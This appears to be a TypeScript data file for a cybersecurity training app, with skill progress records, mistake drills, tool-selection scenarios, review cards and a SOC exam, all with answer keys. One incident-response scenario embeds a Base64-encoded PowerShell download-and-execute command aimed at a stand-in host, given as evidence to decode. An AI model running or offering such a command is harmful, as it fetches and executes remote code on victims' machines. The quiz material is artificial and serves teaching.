import { 
  SkillMasteryRecord, 
  LearnerMistake, 
  MultiToolScenario, 
  SpacedReviewCard, 
  ExamSession 
} from '../types/intelligence';

export const INITIAL_SKILL_MASTERIES: SkillMasteryRecord[] = [
  {
    skillId: 'comp-fund',
    name: 'Computer Architecture & Binaries',
    category: 'Foundations',
    tier: 1,
    theoryCompleted: true,
    practiceCompleted: true,
    practiceScore: 95,
    labCompleted: true,
    labScore: 90,
    assessmentCompleted: true,
    assessmentScore: 100,
    missionCompleted: true,
    missionScore: 92,
    bossCompleted: true,
    bossScore: 94,
    masteryPercentage: 94,
    confidence: 'MASTERED',
    attemptsCount: 2,
    hintsUsedCount: 0,
    lastTrainedAt: '2026-08-20',
    nextSpacedReviewDue: '2026-08-27',
    prerequisites: [],
    isLocked: false
  },
  {
    skillId: 'linux-core',
    name: 'Linux Shell & Permissions (rwx/SUID)',
    category: 'Linux',
    tier: 2,
    theoryCompleted: true,
    practiceCompleted: true,
    practiceScore: 88,
    labCompleted: true,
    labScore: 85,
    assessmentCompleted: true,
    assessmentScore: 80,
    missionCompleted: true,
    missionScore: 78,
    bossCompleted: false,
    bossScore: 0,
    masteryPercentage: 74,
    confidence: 'COMPETENT',
    attemptsCount: 4,
    hintsUsedCount: 2,
    lastTrainedAt: '2026-08-21',
    nextSpacedReviewDue: '2026-08-24',
    prerequisites: ['comp-fund'],
    isLocked: false
  },
  {
    skillId: 'networking-core',
    name: 'TCP/IP, UDP & OSI Model',
    category: 'Networking',
    tier: 2,
    theoryCompleted: true,
    practiceCompleted: true,
    practiceScore: 90,
    labCompleted: true,
    labScore: 80,
    assessmentCompleted: true,
    assessmentScore: 75,
    missionCompleted: false,
    missionScore: 0,
    bossCompleted: false,
    bossScore: 0,
    masteryPercentage: 58,
    confidence: 'FAMILIAR',
    attemptsCount: 3,
    hintsUsedCount: 3,
    lastTrainedAt: '2026-08-21',
    nextSpacedReviewDue: '2026-08-23',
    prerequisites: ['comp-fund'],
    isLocked: false
  },
  {
    skillId: 'subnetting-calc',
    name: 'Subnetting & CIDR Calculation',
    category: 'Networking',
    tier: 2,
    theoryCompleted: true,
    practiceCompleted: true,
    practiceScore: 65,
    labCompleted: false,
    labScore: 0,
    assessmentCompleted: false,
    assessmentScore: 0,
    missionCompleted: false,
    missionScore: 0,
    bossCompleted: false,
    bossScore: 0,
    masteryPercentage: 35,
    confidence: 'BEGINNER',
    attemptsCount: 6,
    hintsUsedCount: 5,
    lastTrainedAt: '2026-08-19',
    nextSpacedReviewDue: '2026-08-22',
    prerequisites: ['networking-core'],
    isLocked: false
  },
  {
    skillId: 'recon-nmap',
    name: 'Port Scanning & Nmap Enumeration',
    category: 'Reconnaissance',
    tier: 3,
    theoryCompleted: true,
    practiceCompleted: true,
    practiceScore: 70,
    labCompleted: false,
    labScore: 0,
    assessmentCompleted: false,
    assessmentScore: 0,
    missionCompleted: false,
    missionScore: 0,
    bossCompleted: false,
    bossScore: 0,
    masteryPercentage: 30,
    confidence: 'BEGINNER',
    attemptsCount: 2,
    hintsUsedCount: 1,
    lastTrainedAt: '2026-08-18',
    nextSpacedReviewDue: '2026-08-23',
    prerequisites: ['linux-core', 'networking-core'],
    isLocked: false
  },
  {
    skillId: 'web-owasp',
    name: 'Web Security & OWASP Top 10',
    category: 'Web Security',
    tier: 4,
    theoryCompleted: true,
    practiceCompleted: false,
    practiceScore: 0,
    labCompleted: false,
    labScore: 0,
    assessmentCompleted: false,
    assessmentScore: 0,
    missionCompleted: false,
    missionScore: 0,
    bossCompleted: false,
    bossScore: 0,
    masteryPercentage: 15,
    confidence: 'BEGINNER',
    attemptsCount: 0,
    hintsUsedCount: 0,
    lastTrainedAt: '2026-08-15',
    nextSpacedReviewDue: '2026-08-25',
    prerequisites: ['networking-core', 'recon-nmap'],
    isLocked: false
  },
  {
    skillId: 'soc-siem',
    name: 'SIEM & SOC Alert Investigation',
    category: 'Defensive',
    tier: 4,
    theoryCompleted: true,
    practiceCompleted: true,
    practiceScore: 80,
    labCompleted: false,
    labScore: 0,
    assessmentCompleted: false,
    assessmentScore: 0,
    missionCompleted: false,
    missionScore: 0,
    bossCompleted: false,
    bossScore: 0,
    masteryPercentage: 35,
    confidence: 'BEGINNER',
    attemptsCount: 1,
    hintsUsedCount: 1,
    lastTrainedAt: '2026-08-19',
    nextSpacedReviewDue: '2026-08-26',
    prerequisites: ['linux-core', 'networking-core'],
    isLocked: false
  },
  {
    skillId: 'priv-esc',
    name: 'Linux & Windows Privilege Escalation',
    category: 'Offensive',
    tier: 5,
    theoryCompleted: false,
    practiceCompleted: false,
    practiceScore: 0,
    labCompleted: false,
    labScore: 0,
    assessmentCompleted: false,
    assessmentScore: 0,
    missionCompleted: false,
    missionScore: 0,
    bossCompleted: false,
    bossScore: 0,
    masteryPercentage: 0,
    confidence: 'BEGINNER',
    attemptsCount: 0,
    hintsUsedCount: 0,
    lastTrainedAt: '',
    nextSpacedReviewDue: '',
    prerequisites: ['linux-core', 'recon-nmap'],
    isLocked: true
  },
  {
    skillId: 'dfir-forensics',
    name: 'Memory & Disk Digital Forensics',
    category: 'Forensics',
    tier: 5,
    theoryCompleted: false,
    practiceCompleted: false,
    practiceScore: 0,
    labCompleted: false,
    labScore: 0,
    assessmentCompleted: false,
    assessmentScore: 0,
    missionCompleted: false,
    missionScore: 0,
    bossCompleted: false,
    bossScore: 0,
    masteryPercentage: 0,
    confidence: 'BEGINNER',
    attemptsCount: 0,
    hintsUsedCount: 0,
    lastTrainedAt: '',
    nextSpacedReviewDue: '',
    prerequisites: ['linux-core', 'soc-siem'],
    isLocked: true
  },
  {
    skillId: 'capstone-enterprise',
    name: 'Enterprise Multi-Stage Capstone Range',
    category: 'Capstone',
    tier: 6,
    theoryCompleted: false,
    practiceCompleted: false,
    practiceScore: 0,
    labCompleted: false,
    labScore: 0,
    assessmentCompleted: false,
    assessmentScore: 0,
    missionCompleted: false,
    missionScore: 0,
    bossCompleted: false,
    bossScore: 0,
    masteryPercentage: 0,
    confidence: 'BEGINNER',
    attemptsCount: 0,
    hintsUsedCount: 0,
    lastTrainedAt: '',
    nextSpacedReviewDue: '',
    prerequisites: ['web-owasp', 'soc-siem', 'priv-esc'],
    isLocked: true
  }
];

export const INITIAL_MISTAKES: LearnerMistake[] = [
  {
    id: 'mistake-subnet-borrow',
    title: 'CIDR Subnet Host Calculation Error',
    category: 'Networking',
    occurrences: 3,
    lastOccurredAt: '2026-08-21',
    whyItHappens: 'Forgetting to subtract 2 (Network ID and Broadcast Address) from 2^(32-CIDR) when calculating usable host capacity.',
    howToFixIt: 'Always use formula: Usable Hosts = (2^(32 - CIDR)) - 2. For /28: 32-28 = 4 bits -> 2^4 = 16 total -> 16 - 2 = 14 usable hosts.',
    relatedSkillId: 'subnetting-calc',
    resolved: false,
    drillQuestion: {
      prompt: 'How many USABLE host IP addresses are available in a /29 subnet?',
      options: ['8 hosts', '6 hosts', '14 hosts', '30 hosts'],
      correctIndex: 1,
      explanation: 'In /29: 32 - 29 = 3 host bits. 2^3 = 8 total IPs. Minus 2 (network & broadcast) = 6 usable host addresses.',
      hint: 'Remember to subtract the network address (.0) and broadcast address (.7).'
    }
  },
  {
    id: 'mistake-suid-perm',
    title: 'Confusing SUID bit (4000) with SGID (2000)',
    category: 'Linux',
    occurrences: 2,
    lastOccurredAt: '2026-08-20',
    whyItHappens: 'Misidentifying the octal prefix or character placement (user triplet vs group triplet) in `ls -l` output.',
    howToFixIt: 'SUID displays as `s` in owner execute position (e.g., -rwsr-xr-x, octal 4755). SGID displays in group position (-rwxr-sr-x, octal 2755).',
    relatedSkillId: 'linux-core',
    resolved: false,
    drillQuestion: {
      prompt: 'Which permissions string indicates a file with the SUID bit set, owned by root?',
      options: [
        '-rwxr-xr-x (755)',
        '-rwsr-xr-x (4755)',
        '-rwxr-sr-x (2755)',
        '-rwxrwxrwt (1777)'
      ],
      correctIndex: 1,
      explanation: '-rwsr-xr-x has \'s\' in the user triplet, allowing unprivileged execution under root owner context.',
      hint: 'Look for \'s\' in the first triplet (user permissions).'
    }
  },
  {
    id: 'mistake-tcp-flags',
    title: 'TCP 3-Way Handshake Flag Sequence Reversal',
    category: 'Networking',
    occurrences: 2,
    lastOccurredAt: '2026-08-19',
    whyItHappens: 'Mixing up who sends SYN-ACK versus ACK during connection initialization.',
    howToFixIt: 'Client initiates SYN -> Server responds SYN-ACK -> Client concludes ACK. Then ESTABLISHED state begins.',
    relatedSkillId: 'networking-core',
    resolved: true,
    drillQuestion: {
      prompt: 'What is the exact second packet sent during a standard TCP 3-way handshake?',
      options: [
        'Client sends ACK',
        'Server sends SYN-ACK',
        'Server sends FIN-ACK',
        'Client sends RST'
      ],
      correctIndex: 1,
      explanation: 'Step 1: Client -> Server [SYN]. Step 2: Server -> Client [SYN, ACK]. Step 3: Client -> Server [ACK].',
      hint: 'The server acknowledges the client SYN while synchronizing its own sequence number.'
    }
  }
];

export const MULTI_TOOL_SCENARIOS: MultiToolScenario[] = [
  {
    id: 'scen-01',
    title: 'Rogue Service Discovery on DMZ Host',
    category: 'Recon & Enumeration',
    difficulty: 'Intermediate',
    scenarioContext: 'You are investigating an alert from the perimeter IDS claiming an unauthorized database or listener was started on internal host 192.168.10.45. You have network access and need to enumerate all listening TCP ports and detect daemon versions non-destructively.',
    telemetryEvidence: 'IDS Alert ID #8849: Outbound DNS query for c2.darkmesh.io from 192.168.10.45:49152 -> 8.8.8.8:53.',
    targetType: 'Target Host: 192.168.10.45 (Linux DMZ Web Server)',
    tools: [
      {
        name: 'Nmap',
        description: 'Network exploration tool and security/port scanner with service banner probing (-sV).',
        isCorrect: true,
        rationale: 'Nmap is the industry standard for discovering open listening ports, service versions, and OS fingerprints remotely.'
      },
      {
        name: 'Wireshark',
        description: 'Passive packet analyzer and dissector for live PCAP streams.',
        isCorrect: false,
        rationale: 'Wireshark only listens passively. It cannot actively probe closed/open ports across a remote target unless active traffic is currently passing.'
      },
      {
        name: 'Ghidra',
        description: 'Software reverse engineering (SRE) suite for decompiling binaries.',
        isCorrect: false,
        rationale: 'Ghidra is used to decompile and reverse engineer extracted binaries, not to scan remote network interfaces.'
      },
      {
        name: 'CyberChef',
        description: 'Web app for encryption, encoding, compression, and data analysis.',
        isCorrect: false,
        rationale: 'CyberChef transforms strings and hashes; it has no network socket scanning capabilities.'
      }
    ],
    followUpPrompt: 'Which specific Nmap flag combo performs a SYN stealth scan with version detection and default safe scripts against all ports?',
    followUpOptions: [
      'nmap -sS -sV -sC -p- 192.168.10.45',
      'nmap -A -T5 -F 192.168.10.45',
      'nmap --ping-only 192.168.10.45',
      'nmap -sU -p 53 192.168.10.45'
    ],
    followUpCorrectIndex: 0,
    followUpExplanation: '-sS activates TCP SYN stealth scan, -sV checks service versions, -sC runs default NSE scripts, and -p- scans all 65,535 ports.',
    xpReward: 150
  },
  {
    id: 'scen-02',
    title: 'Obfuscated PowerShell Encoded Command Analysis',
    category: 'Incident Response',
    difficulty: 'Beginner',
    scenarioContext: 'An EDR sensor caught a suspicious process: `powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZQB4AGkAbAAuAGwAbwBjAGEAbAAnACkA` on a finance workstation. You need to decode the command safely offline.',
    telemetryEvidence: 'Process Parent: winword.exe (PID: 4120) -> Spawned powershell.exe with Base64 payload.',
    targetType: 'Extracted String Artifact',
    tools: [
      {
        name: 'CyberChef',
        description: 'The Cyber Swiss Army Knife for Base64 decoding, UTF-16LE conversion, and string recipes.',
        isCorrect: true,
        rationale: 'PowerShell -enc uses Base64 encoded UTF-16LE (Unicode). CyberChef safely decodes this recipe in seconds without executing the payload.'
      },
      {
        name: 'Burp Suite',
        description: 'Web application security testing proxy.',
        isCorrect: false,
        rationale: 'Burp Suite is a web proxy for HTTP/HTTPS manipulation, not optimized for complex malware string pipeline analysis.'
      },
      {
        name: 'Tcpdump',
        description: 'Command-line packet analyzer for Linux network interfaces.',
        isCorrect: false,
        rationale: 'Tcpdump captures network packets, it cannot decode a static clipboard string directly.'
      },
      {
        name: 'Hydra',
        description: 'Parallelized network login brute-forcing tool.',
        isCorrect: false,
        rationale: 'Hydra attacks authentication protocols; it is irrelevant for static string deobfuscation.'
      }
    ],
    followUpPrompt: 'In CyberChef, which recipe sequence correctly converts PowerShell Base64 into readable ASCII?',
    followUpOptions: [
      'From Base64 -> Decode Text (UTF-16LE)',
      'To Hex -> From Base32',
      'ROT13 -> URL Decode',
      'AES Decrypt with key 0000'
    ],
    followUpCorrectIndex: 0,
    followUpExplanation: 'Windows PowerShell internal encoding for the -enc switch is UTF-16 Little Endian represented in Base64.',
    xpReward: 120
  },
  {
    id: 'scen-03',
    title: 'Investigating Suspicious Beaconing in PCAP Capture',
    category: 'Threat Hunting',
    difficulty: 'Hard',
    scenarioContext: 'Network security exported a 50MB PCAP file (`incident_capture.pcapng`) containing 45,000 packets recorded when a banking trojan supposedly infected an employee laptop. You need to inspect TLS SNI headers and HTTP POST payloads.',
    telemetryEvidence: 'Zeek log flag: SSL::Certificate_Validation_Failed to destination IP 185.220.101.5.',
    targetType: 'Packet Capture File (incident_capture.pcapng)',
    tools: [
      {
        name: 'Wireshark',
        description: 'Interactive graphical packet analyzer with display filters (e.g., http.request.method == "POST" or tls.handshake.extensions_server_name).',
        isCorrect: true,
        rationale: 'Wireshark is the premier tool for deep packet dissection, stream following, and cryptographic handshake inspection.'
      },
      {
        name: 'SQLmap',
        description: 'Automated SQL injection and database takeover tool.',
        isCorrect: false,
        rationale: 'SQLmap tests web endpoints for SQL injection vulnerabilities; it does not read PCAP network captures.'
      },
      {
        name: 'Metasploit',
        description: 'Exploitation framework and payload generator.',
        isCorrect: false,
        rationale: 'Metasploit delivers exploits against target hosts, it is not an evidence packet analysis tool.'
      },
      {
        name: 'John the Ripper',
        description: 'Offline password cracking utility.',
        isCorrect: false,
        rationale: 'John cracks hashes, it does not analyze network packet streams.'
      }
    ],
    followUpPrompt: 'Which Wireshark display filter isolates all DNS queries requesting domain resolution for suspicious top-level domains?',
    followUpOptions: [
      'dns.flags.response == 0 && dns.qry.name',
      'tcp.port == 80',
      'ip.addr == 127.0.0.1',
      'frame.len > 1500'
    ],
    followUpCorrectIndex: 0,
    followUpExplanation: '`dns.flags.response == 0` filters strictly for DNS client query packets (not server replies), and `dns.qry.name` displays the target hostname.',
    xpReward: 180
  }
];

export const SPACED_REVIEW_CARDS: SpacedReviewCard[] = [
  {
    id: 'rev-01',
    skillId: 'networking-core',
    skillName: 'TCP/IP & Ports',
    intervalDays: 3,
    dueDate: '2026-08-22',
    isDue: true,
    prompt: 'What port and protocol does DNS use for standard client name resolution requests?',
    options: ['Port 53 / UDP', 'Port 53 / TCP', 'Port 80 / TCP', 'Port 67 / UDP'],
    correctIndex: 0,
    explanation: 'Standard DNS queries use UDP port 53 for low latency. TCP 53 is used for large responses or zone transfers exceeding 512 bytes.'
  },
  {
    id: 'rev-02',
    skillId: 'linux-core',
    skillName: 'Linux Shell & Permissions',
    intervalDays: 7,
    dueDate: '2026-08-22',
    isDue: true,
    prompt: 'Which Linux command lists all open files and network sockets associated with active processes?',
    options: ['lsof -i', 'cat /etc/hosts', 'chmod 777', 'uname -r'],
    correctIndex: 0,
    explanation: '`lsof -i` lists all internet and network connections opened by running processes.'
  },
  {
    id: 'rev-03',
    skillId: 'subnetting-calc',
    skillName: 'Subnetting',
    intervalDays: 1,
    dueDate: '2026-08-22',
    isDue: true,
    prompt: 'Given network 192.168.1.0/24, if you subnet it into /26 networks, what is the broadcast address of the FIRST subnet?',
    options: ['192.168.1.63', '192.168.1.64', '192.168.1.255', '192.168.1.31'],
    correctIndex: 0,
    explanation: 'A /26 subnet has block size of 64 (256-192=64). First subnet spans 192.168.1.0 to 192.168.1.63 (Broadcast: .63).'
  }
];

export const CERTIFICATION_EXAM_SESSIONS: ExamSession[] = [
  {
    id: 'exam-soc-lvl1',
    title: 'SOC Analyst Tier 1 — Pro Certification Exam',
    roleRef: 'soc-analyst',
    durationMinutes: 15,
    passingScorePercent: 75,
    questions: [
      {
        id: 'q1',
        category: 'Networking',
        skillRef: 'networking-core',
        prompt: 'An endpoint (10.0.2.15) sends traffic to 198.51.100.4 on destination port 443. What protocol is being transported and what is the expected state of the data stream?',
        options: [
          'HTTPS / TLS encrypted application stream',
          'Unencrypted HTTP plaintext payload',
          'SSH terminal remote connection',
          'DNS zone transfer'
        ],
        correctIndex: 0,
        explanation: 'Port 443 is the standard IANA port for HTTPS running TLS encrypted streams.',
        points: 20
      },
      {
        id: 'q2',
        category: 'Linux Forensics',
        skillRef: 'linux-core',
        prompt: 'During live triage of an Ubuntu server, which directory stores historical system authentication attempts, successful logins, and sudo executions?',
        options: [
          '/var/log/auth.log',
          '/etc/shadow',
          '/usr/bin/sudoers',
          '/tmp/.syslog'
        ],
        correctIndex: 0,
        explanation: 'Debian and Ubuntu store authentication and authorization events in /var/log/auth.log.',
        points: 20
      },
      {
        id: 'q3',
        category: 'SIEM Triage',
        skillRef: 'soc-siem',
        prompt: 'You notice 2,500 failed SSH login attempts from an external IP within 60 seconds against root, admin, and test. What attack pattern is occurring?',
        options: [
          'SSH Brute-force / Credential Guessing attack',
          'SQL Injection attack',
          'Cross-Site Scripting (XSS)',
          'ARP Poisoning cache spoof'
        ],
        correctIndex: 0,
        explanation: 'High volume rapid authentication failures targeting common usernames represent automated brute-force attacks.',
        points: 20
      },
      {
        id: 'q4',
        category: 'Reconnaissance',
        skillRef: 'recon-nmap',
        prompt: 'Which Nmap scan type is known as the "half-open" stealth scan because it tears down the connection with an RST before the 3-way handshake completes?',
        options: [
          '-sS (TCP SYN Scan)',
          '-sT (TCP Connect Scan)',
          '-sU (UDP Scan)',
          '-sn (Ping Scan)'
        ],
        correctIndex: 0,
        explanation: 'The TCP SYN scan (-sS) sends a SYN, waits for SYN-ACK, and immediately sends RST instead of ACK, leaving the socket half-open.',
        points: 20
      },
      {
        id: 'q5',
        category: 'Incident Response',
        skillRef: 'comp-fund',
        prompt: 'According to the Order of Volatility in digital forensics (RFC 3227), which artifact should be captured FIRST before powering off or rebooting a compromised system?',
        options: [
          'RAM (Volatile System Memory) and CPU Cache',
          'Secondary NVMe Solid-State Disk',
          'Archived Tape Backups',
          'Printed Network Topology'
        ],
        correctIndex: 0,
        explanation: 'Volatile memory (RAM) is lost immediately upon reboot or power loss; it must be imaged first.',
        points: 20
      }
    ]
  }
];
